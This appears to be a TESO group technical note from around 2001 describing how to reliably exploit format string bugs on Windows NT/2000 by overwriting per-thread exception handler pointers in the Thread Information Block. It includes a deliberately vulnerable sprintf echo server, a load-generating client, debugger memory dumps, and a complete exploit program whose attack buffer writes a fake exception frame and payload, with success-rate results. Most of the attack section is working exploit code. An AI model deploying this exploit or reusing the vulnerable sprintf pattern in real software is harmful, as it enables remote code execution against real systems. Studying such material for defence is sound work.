@@ -1,0 +1,491 @@
+0034 2001/02/25  advanced way to more reliably exploit NT format bugs remotely
+==== TESO Informational =======================================================
+This piece of information is to be kept confidential.
+===============================================================================
+
+Description ..........: way of getting control with format string bugs 
+Date .................: 2000/12/28 06:00
+Author ...............: halvar
+Publicity level ......: unknown
+Affected .............: NT/Win32 specific
+Type of entity .......: NT internals
+Type of discovery ....: useful information
+Severity/Importance ..: n/a
+Found by .............: halvar
+
+===============================================================================
+
+We all know and love format string bugs. Especially on closed-source platforms,
+then can still be found in large numbers. Unfortunately, the really interesting
+affected programs under NT run multi-threaded, making it relatively hard to
+reliably get execution under our control as we cannot overwrite addresses on
+the stack. Under Win2k, a watchdog will restart the service once it dies, so
+if we are first to connect to it after the restart we can reliably guess what
+to overwrite. Under NT, no watchdog is around, so you have only one shot to 
+get control. 
+
+Now, the other choice that we have is an import table overwrite, which will not
+always work either as apparently many compilers set the import address table 
+inside the code section, making it a read-only page once it has been filled by
+the OS. Writing to it will result in a GPF.
+
+This informational will play around with a new cool way of getting control of
+our thread by a yet-unknown technique called "TIB Exception Structure 
+Overwrite" (TESO) :-P.
+
+In my last informational (0033) I described a way to walk from the pointer at
+fs:[0] through the exception structures until I have found a function inside
+KERNEL32.DLL. This time, I will play with structured exception handling again,
+so it is a good idea to have absorbed some information from the last informat-
+ional. 
+
+Every thread that is created has a structure called "Thread Information Block"
+(TIB) mapped at fs:[0]. (Some people call it "Thread Exception Block", and the
+Wine project has a pretty good/slightly errant documentation of it in thread.h)
+The first DWORD of this structure is a pointer to an __EXCEPTION_FRAME 
+structure, which consists of two pointers: One to the next
+__EXCEPTION_FRAME, and one to the function that is supposed to
+handle any exception that occurs. Now, the trick is to create a fake exception
+handling structure in memory and then to overwrite as many TIB entries as we
+can until we trigger an exception. When that exception is triggered, our fake
+exception handling structure will lead to control being transferred to the 
+code we pointed to in our structure.
+
+What we have to do in our format string is:
+
+1. Create a fake exception handling structure somewhere in memory. This 
+means we either have to know an address at which a pointer to a buffer we
+control lies or we have to write a pointer to a buffer we control into 
+memory at some point.
+
+2. Start overwriting TIB's, starting with the first thread, then the second
+etc. until there are no more threads and our attempts to write to a nonpaged
+section of memory will lead to an exception.
+
+3. The exception will transfer control to our exceptionhandler (the buffer
+we control) in which we can then execute code.
+
+Problem Nr 1: We cannot write to any location outside of our current data 
+segment, how the hell are we going to write to fs:[0] ?
+
+Answer: The TIB is mapped into the data/code segment as well, at an address
+pointed to by fs:[0x18]. I ran a few tests on a few systems from NT4 SP5 up
+to Win2k SP1 and one could foresee certain regularities between all these
+systems that allow us to reliably tell where the TIB of a certain thread
+will be in regular memory.
+The regularity in TIB allocation follows here: 
+The first thread of an application always has his TIB mapped at 0x7FFDE000,
+and up until the 11th thread (which lies at 0x7FFD4000) we have single page
+decrements from the initial value (-0x1000). Then we have a rather odd gap,
+and the 12th threads TIB will be located at 0x7FFAF000. All subsequent 
+threads will have their TIB allocated sequentally with (-0x1000) difference
+from here on, up until thread 250 where I stopped testing :-)
+
+Problem Nr 2: We cannot easily write to addresses containing NULL bytes,
+and we cannot assure that the location (TIB)-1 will be paged. 
+What can we do here ?
+
+Answer: Not much. This is one of the major drawbacks of this approach.
+The problem lies in a form of memory fragmentation that occurs like this:
+Several threads are created, and their TIBs are paged into the CS/DS acc-
+ording to the rules outlined before. Now, some of these threads will exit
+again and their respective TIB-pages will be freed; this can lead to 
+a memory layout somewhat like this:
+
+[0x7FFDE000 -- paged]
+[0x7FFDD000 -- nonpaged]
+[0x7FFDC000 -- nonpaged]
+[0x7FFDB000 -- paged]
+[0x7FFDA000 -- paged]
+[0x7FFD9000 ... nonpaged from here on]
+
+Now we can see that we get into trouble as we will trigger an exception
+after having overwritten the first exception handler, without touching 
+the other two handlers we would need to overwrite.
+
+Now the trick is that as soon as new threads are created, their TIBs are
+paged into these gaps. So what we can do is to create our thread that
+will execute the format string bug, and then, before we actually execute
+the vulnerable code, create a lot of arbitrary threads, hopefully enough
+to fill all gaps. We can then sequentally overwrite the exception handlers
+and trigger an exception to gain control.
+
+Problem Nr 3: 
+While experimenting with exceptionhandlers for a while I found out that
+apparently NT wants the pointer at fs:[0] to point somewhere between the
+"stack bottom" and the "stack top" of the offending thread. 
+(For those interested, that validation happens in a function called 
+RtlDispatchException() which is a called by KiUserExceptionDispatcher)
+If the pointer points elsewhere the user-installed exception handler will
+not be called; an exception called EXCEPTION_INVALID_DISPOSITION will be
+raised instead.
+
+Answer:
+Since we clearly cannot write an EXCEPTION_FRAME for each thread into its
+stack region we need a different solution. Looking at thread.h from the
+WINE project, we can see that the stack_top and stack_low variables are
+stored at fs:[4] and fs:[8] respectively. Now this implies that we can 
+easily alter the range in which our EXCEPTION_FRAME can be created. So 
+what we'll need to do in addition to overwriting the pointer at fs:[0] is
+to overwrite the stack_top variables high-order byte with 0x7F, thus mak-
+ing sure that we pass the tests inside RtlDispatchException and praying 
+that we don't fuck anything up so badly that it'll crash NT :)
+The EXCEPTION_FRAME has to be created somewhere above stack_low in memory
+then. For my example, I will construct it inside MSVCRT.DLL's data segment.
+
+Here follows the code (I compiled stuff with BC++; I am not sure how stuff 
+looks when a different compiler works his magic, so you'll probably need
+some tweaking.):
+
+---- snip ---- lameserver.c -------
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+
+unsigned long __stdcall NewThread(void *singlearg)
+{
+        int     sock, blah;
+        char    lame2[5000],lame[3000];
+        
+        sock = (int)singlearg;
+        blah = recv(sock, lame, sizeof(lame)-1, 0);
+        if(blah != -1)
+        {
+                lame[blah] = 0;         // NULL-terminate
+                sprintf(lame2, lame);   
+                printf("%s\n", lame2);
+        }
+
+        send(sock, lame2, strlen(lame2), 0);
+        Sleep(500);
+        closesocket(sock);
+        ExitThread(1);
+}
+
+int main(int argc, char **argv)
+{
+        WSADATA WSAdat;
+        struct  sockaddr_in Host;
+        int     idThread;
+        SOCKET  sock1;
+        
+        WSAStartup(0x101, &WSAdat);     // Startup the sockets interface
+        Host.sin_family = AF_INET;
+        Host.sin_addr.s_addr = 0;
+        Host.sin_port = htons(999);
+        sock1 = socket(AF_INET, SOCK_STREAM, 0);
+        bind(sock1, (struct sockaddr *)&Host, sizeof(struct sockaddr_in));
+        while(1)
+        {
+                listen(sock1, 0x3);
+                printf("Waiting for connection\n");
+                CreateThread(NULL, 0, &NewThread, (void *)accept(sock1, NULL, NULL), 0, &idThread);        
+        }
+}
+----- snip ---- lameserver.c EOF
+
+The server will wait for an incoming connection and spawn a new thread. For each
+connection the thread will read a string from the network, feed it into sprintf()
+to create something format-string-buggish and then echo it back to the client. It
+will then disconnect and kill the thread it just created.
+
+----- snip ---- lameclient.c --------
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+
+#define MAX_THREAD_NORMAL       20
+#define MAX_THREAD_LINGER       10
+
+int     ThreadCount = MAX_THREAD_NORMAL;
+int     ThreadLinger = MAX_THREAD_LINGER;
+
+void    NewThread(void *singlearg)
+{
+        int     sock, iLinger;
+        struct  sockaddr_in Host;
+        unsigned long   rndval;
+        
+        iLinger = 0;    // zero the var
+        
+        if((GetTickCount() & 0xF) > 13)  // set a certain frequency for lingering
+        {                               // connections
+                Sleep(0);
+                if(ThreadLinger > 0)
+                {
+                        ThreadLinger--;
+                        rndval = 0xFFFF;
+                        iLinger = 1;    // set iLinger to TRUE
+                }
+        }
+        
+        if(iLinger == 0)
+        {
+                Sleep(0);
+                rndval = GetTickCount() & 0xFF;
+                Sleep(0);
+                rndval *= (GetTickCount() & 0x7F);
+        }
+        printf("[%lx] Connecting with a wait time of %ld ms -- ThreadCount is %ld    \n", singlearg, rndval, MAX_THREAD_NORMAL-ThreadCount-1);
+                                
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        Host.sin_family = AF_INET;
+        Host.sin_addr.s_addr = 0x0100007F;      // 127.0.0.1
+        Host.sin_port = htons(999);
+        
+        connect(sock, (struct sockaddr *)&Host, sizeof(Host));
+        Sleep(rndval);
+        printf("[%lx] Exiting...\n", singlearg);
+        closesocket(sock);
+        ThreadCount++;
+        if(iLinger)
+                ThreadLinger++;
+                
+        ExitThread(0);
+}
+
+int main(int argc, char **argv)
+{
+        WSADATA wsaDat;
+        int     idThread;
+        
+        idThread = 0;
+        
+        WSAStartup(0x101, &wsaDat);
+        while(1)
+        {
+                if(ThreadCount > 0)
+                {
+                        ThreadCount--;        
+                        Sleep(GetTickCount() & 0x3FF);
+                        CreateThread(NULL, 0, &NewThread, (void *)idThread, 0, &idThread);
+                }
+                else
+                        Sleep(GetTickCount() & 0x3FFF);
+        }
+}
+----- snip ---- lameclient.c EOF
+
+This lame piece of crap multithreaded client will create a bunch of threads
+which will connect to our lame server, keep a connection open for a certain
+random time and then close the connection again. A few lingering connections
+are around that take a bit longer to finish. As soon as the maximum number
+of threads is reached, the client will pause for a while, letting a bunch of
+threads die again. This is pretty good to simulate the fragmentation in 
+memory in case the connection count on the server is receding. 
+An example of fragmented memory just after the connection count dropped from
+29 to 17 is here:
+
+001B:7FFDE000 0012FD50  00130000  0012E000  00000000      P...............
+001B:7FFDD000 0538FFDC  05390000  0538F000  00000000      ..8...9...8.....
+001B:7FFDC000 00E8FBF8  00E90000  00E8F000  00000000      ................
+001B:7FFDB000 00F8FBF8  00F90000  00F8F000  00000000      ................
+001B:7FFDA000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFD9000 0168FBF8  01690000  0168F000  00000000      ..h...i...h.....
+001B:7FFD8000 0178FBF8  01790000  0178F000  00000000      ..x...y...x.....
+001B:7FFD7000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFD6000 04C8FBF8  04C90000  04C8F000  00000000      ................
+001B:7FFD5000 0398FBF8  03990000  0398F000  00000000      ................
+001B:7FFD4000 0438FBF8  04390000  0438F000  00000000      ..8...9...8.....
+001B:7FFAF000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFAE000 0208FBF8  02090000  0208F000  00000000      ................
+001B:7FFAD000 0218FBF8  02190000  0218F000  00000000      ................
+001B:7FFAC000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFAB000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFAA000 0308FBF8  03090000  0308F000  00000000      ................
+001B:7FFA9000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFA8000 0318FBF8  03190000  0318F000  00000000      ................
+001B:7FFA7000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFA6000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFA5000 04D8FBF8  04D90000  04D8F000  00000000      ................
+001B:7FFA4000 ????????  ????????  ????????  ????????      fragmented :-)
+001B:7FFA3000 04A8FBF8  04A90000  04A8F000  00000000      ................
+001B:7FFA2000 0528FBF8  05290000  0528F000  00000000      ................
+001B:7FFA1000 04B8FBF8  04B90000  04B8F000  00000000      ................
+
+Now, what our exploit needs to do is:
+
+1. Connect to the server to create a thread that will later send the
+format string.
+2. Connect to the server with a bunch of more threads to fill in as many
+gaps as possible to "defragment" the memory.
+3. The first created thread will now start to write to the exception 
+handlers and then trigger an exception. In order to pass the checks inside
+KiUserExceptionDispatcher() we have to overwrite the highest-order byte
+of the stack_top variable located at fs:7 as well.
+
+The code for this follows right here :)
+
+---- snip --- sploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+
+/*
+What we want to do with the format string is this:
+Write 0x78038010 to location 0x78038004; then write an INT3 to 0x78038010,
+then write 0x78038000 to the exception handlers until we hit an exception...
+*/
+
+
+unsigned char szAttackBuffer[] = {
+"\x04\x80\x03\x78%12c%n  "              // Create ptr to our code
+"\x05\x80\x03\x78%c%105c%n   "
+"\x06\x80\x03\x78%.f%123c%n  "
+"\x07\x80\x03\x78%.f%65c%n   "
+
+"\x10\x80\x03\x78%.f%76c%n%51c%.f"      // Create a single 0xCC as "payload"
+
+//--- First Thread
+"\x07\xE0\xFD\x7F%123c%n%c%c "          // set the stack top to 0x7F120000 ;>
+"\x01\xE0\xFD\x7F%250c%n "              // write 0x80 to byte 2 of xcpt frame *
+"\x02\xE0\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3 of xcpt frame * 
+"\x03\xE0\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\xDF\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00
+//--- Second Thread                      
+"\x07\xD0\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\xD0\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\xD0\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\xD0\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\xCF\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Third Thread
+"\x07\xC0\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\xC0\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\xC0\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\xC0\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\xBF\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Fourth Thread
+"\x07\xB0\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\xB0\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\xB0\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\xB0\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\xAF\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Fifth Thread
+"\x07\xA0\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\xA0\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\xA0\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\xA0\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x9F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Sixth Thread
+"\x07\x90\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x90\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x90\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x90\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x8F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Seventh Thread
+"\x07\x80\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x80\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x80\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x80\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x7F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Eight Thread
+"\x07\x70\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x70\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x70\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x70\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x6F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Ninth Thread
+"\x07\x60\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x60\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x60\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x60\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x5F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Tenth Thread
+"\x07\x50\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x50\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x50\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x50\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x4F\xFD\x7F%c%n%128c%c "          // write 0x00 to byte 1 and pad to 00        
+//--- Eleventh Thread
+"\x07\x40\xFD\x7F%123c%n%c%c "          // set stack top to 0x7Fxxxxxx :)
+"\x01\x40\xFD\x7F%250c%n "              // write 0x80 to byte 2        
+"\x02\x40\xFD\x7F%125c%c%n%c "          // write 0x03 to byte 3
+"\x03\x40\xFD\x7F%c%110c%n%.f"          // write 0x78 to byte 4
+"\xFD\x3F\xFD\x7F%c%n%n"      // write 0x00 to byte 1 and trigger xception
+};
+
+int main(int argc, char **argv)
+{
+        WSADATA wsaDat;
+        struct  sockaddr_in Host;
+        int     sock, socks[10], i;
+                
+        WSAStartup(0x101, &wsaDat);
+        
+        Host.sin_family = AF_INET;
+        Host.sin_addr.s_addr = 0x0100007F;
+        Host.sin_port = htons(999);
+        
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        connect(sock, (struct sockaddr *)&Host, sizeof(Host));  // create attack 
+                                                                // thread
+        for(i = 1; i < 11; i++)
+        {
+                socks[i] = socket(AF_INET,SOCK_STREAM, 0);
+                connect(socks[i], (struct sockaddr *)&Host, sizeof(Host));
+        }
+        Sleep(50);
+        send(sock, szAttackBuffer, strlen(szAttackBuffer), 0);
+}
+----- snip --- sploit.c EOF
+
+Now, we run into a few small limitations of our compilers snprintf()-function,
+apparently the runtime of BC++ will not allow us to have too long output, so
+we cannot overwrite more than 10 exception handlers in the current setup.
+(This number can be optimized by choosing better addresses for the EXCEPTION_
+FRAME structure and by optimizing the writing process where possible).
+Therefore, under really heavy load (dozens of threads active at one time)
+one might want to create multiple threads which overwrite different subsets
+of the TIBs a time. This is up to the attackers creativity, I am not going
+to play through every possible situation here.
+
+Testrun: The above examples were used for 11 trial runs (don't ask why).
+(Remember, 10 of the threads in the process are _our_ threads, so de-facto 
+load of the server without our intervention is the value in brackets)
+
+Try No #1    Threads in Process    Address of thread TIB    Status ?     
+   1                19(9)              0x7FFDD000           SUCCESS
+   2                21(11)             0x7FFDC000           SUCCESS
+   3                28(18)             0x7FFDD000           SUCCESS 
+   4                27(17)             0x7FFD5000           SUCCESS
+   5                18(8)              0x7FFDD000           SUCCESS
+   6                29(19)             0x7FFA6000           FAILURE
+   7                24(14)             0x7FFDB000           SUCCESS
+   8                27(17)             0x7FFD6000           SUCCESS
+   9                31(21)             0x7FFA7000           FAILURE
+  10                30(20)             0x7FFA6000           FAILURE
+  11                25(15)             0x7FFD6000           SUCCESS
+
+Now, for a server with a load between 8-21 threads (as the example program
+lameserver.c and lameclient.c create) the example exploit will yield decent
+results with an exploitation reliability of about 72%. (Yes I know I need
+more test results to make reliable assumptions about reliability ! :)
+
+The fun part is that
+this will work against any SP of NT/2k known to me and will even work if the
+binaries in memory are different from those expected in the exploit (assuming
+the writable area where we create the EXCEPTION_FRAME stays writable).
+In fact you have to know very little in order to have a pretty decent proba-
+bility of succeeding. But keep in mind its only a propability, and this is
+not the nice 80's style single-thread process-only exploitation most people
+are used to.
+
+Possible ways to improve the probability for success (up to the reader to
+actually try out :)
+1. Try to use multiple threads to overwrite a larger number of EXCEPTION_FRAME
+pointers and keeping the thread alive afterwards.
+2. The worse the memory is fragmented, the better our chances to get our main
+exploiting thread to be among the first 10 in memory. So creating memory frag-
+mentation works for us -- try creating a heavy server load with 30-40 threads,
+then let them all die quickly. Connect immediately afterwards with the main
+exploiting thread.
+
+Ok, Tuesday night, 3 o'clock in the morning. Time for bed. Stay tooned for my
+next informational presenting yet another leeto Win32 fmt bug exploitation 
+technique: UEFA (Unhandled Exception Filter Attack) :)
+
+===============================================================================
+
